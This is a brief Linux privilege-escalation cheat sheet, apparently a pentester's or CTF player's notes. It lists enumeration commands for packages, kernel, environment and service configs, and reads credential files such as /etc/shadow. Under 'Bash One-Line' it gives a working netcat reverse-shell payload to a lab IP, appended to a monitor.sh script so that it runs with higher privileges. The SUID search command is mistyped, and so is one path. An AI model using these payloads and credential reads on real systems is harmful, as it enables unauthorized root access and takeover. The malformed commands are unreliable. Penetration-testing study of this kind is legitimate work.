#  Linux Privilege Escalation


#### What applications are installed? What version are they? Are they currently running?



~~~
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
~~~

#### What's the distribution type? What version?


~~~
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
~~~

#### What's the Kernel version? Is it 64-bit?

~~~
cat /proc/version   
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
~~~

#### What can be learnt from the environmental variables?

~~~
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
~~~


##### Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?

~~~
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
~~~


#### What sensitive files can be found?

~~~
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
~~~

#### Bash One-Line
~~~
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.10 7242 > /tmp/f" >> monitor.sh
~~~



Use the following command to obtain all items with the suid bit set.


~~~
Find / type -f -perm -u=s 2>/dev/null
~~~


Refrence:

https://www.stationx.net/linux-privilege-escalation/#:~:text=What%20is%20privilege%20escalation%20in,tasks%20beyond%20their%20intended%20permissions.


